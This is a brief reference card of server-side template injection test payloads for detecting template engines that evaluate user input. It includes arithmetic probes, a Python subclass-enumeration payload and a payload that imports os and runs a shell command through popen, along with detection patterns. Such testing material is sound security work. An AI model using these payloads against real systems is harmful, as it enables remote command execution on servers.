# SSTI Payload Templates

## Overview
- Purpose: Provide reusable SSTI payloads for testing template expression evaluation.
- Category: web_security
- Severity: info
- Tags: ssti, payloads, web_security

## Context and Use-Cases
- Identifying template engines that evaluate user-controlled input.

## Key Parameters and Inputs
- attack_type (string): "ssti"
- complexity (string): one of [basic, advanced]

## Procedure
1. Start with arithmetic probes.
2. Escalate to environment/globals access if evaluation occurs.

## Examples
- Payloads:
```
{{7*7}}
${7*7}
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

## Indicators / Detection
- Patterns: `{{ }}`, `${ }`, `<%= %>` with evaluated output.

## Limitations and Caveats
- Risk classification is keyword-based.

## Source Excerpts
- [S1] "ssti": { "basic": ["{{7*7}}", "${7*7}", ...], "advanced": ["{{config}}", "{{''.__class__.__mro__[2].__subclasses__()}}", ...] }

## References
-
